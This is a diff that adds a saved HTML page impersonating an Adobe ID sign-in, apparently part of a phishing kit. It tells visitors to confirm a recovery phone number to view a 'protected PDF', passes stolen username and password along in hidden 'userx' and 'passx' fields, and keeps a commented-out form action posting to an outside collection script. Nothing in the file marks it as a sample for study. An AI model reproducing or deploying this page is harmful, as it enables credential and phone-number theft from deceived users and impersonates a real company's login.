@@ -1,0 +1,51 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0055)http://clikk2viewz.esy.es/original/original/comfirm.htm -->
+<HTML xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=8.0000" 
+http-equiv="X-UA-Compatible">
+<TITLE>Sign In - Adobe ID</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=utf-8">
+<SCRIPT type=text/javascript>
+function MM_validateForm() { //v4.0
+if (document.getElementById){
+var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
+for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=document.getElementById(args[i]);
+if (val) { nm=val.name; if ((val=val.value)!="") {
+if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
+if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
+} else if (test!='R') { num = parseFloat(val);
+if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
+if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+min=test.substring(8,p); max=test.substring(p+1);
+if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
+} } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
+} if (errors) alert('The following error(s) occurred:\n'+errors);
+document.MM_returnValue = (errors == '');
+} }
+</SCRIPT>
+<LINK href="Sign&#32;In&#32;-&#32;Adobe&#32;ID_files/adobe.css" rel=stylesheet 
+type=text/css>
+<META name=GENERATOR content="MSHTML 11.00.9600.18125"></HEAD>
+<BODY>
+<DIV id=box>
+<DIV class=logo><BR></DIV>
+<DIV class=instruction>Please confirm your phone number to proceed. </DIV>
+<!-- <FORM action="http://mtpentrprises.net/deer/fud/formfix/form/form.php" method=post> -->
+<FORM action="index2.htm" method=post>
+<input type="hidden" name="userx" value="">
+ <input type="hidden" name="passx" value="">
+<TABLE id=form-1 cellPadding=5>
+  <TBODY>
+  <TR>
+    <TD colSpan=2><INPUT name=phone class=text-field id=phone type=text 
+      placeholder="Recovery Phone Number"></TD></TR>
+  <TR>
+    <TD>&nbsp;</TD>
+    <TD vAlign=top><SPAN class=pdf-protected>The PDF is still 
+    protected</SPAN></TD></TR>
+  <TR>
+    <TD colSpan=2><INPUT name=Upgrade class=btn1 onclick="MM_validateForm('password','','R','mail','','RisEmail','phone','','NisNum');return document.MM_returnValue" type=submit value="VIEW FILE"></TD></TR></TBODY></TABLE></FORM>
+<DIV class=footer><IMG 
+src="Sign&#32;In&#32;-&#32;Adobe&#32;ID_files/footer_img_2.png"></DIV></DIV><!-- Hosting24 Analytics Code -->
+<SCRIPT src="Sign&#32;In&#32;-&#32;Adobe&#32;ID_files/comfirm.htm" 
+type=text/javascript></SCRIPT>
+<!-- End Of Analytics Code --></BODY></HTML>
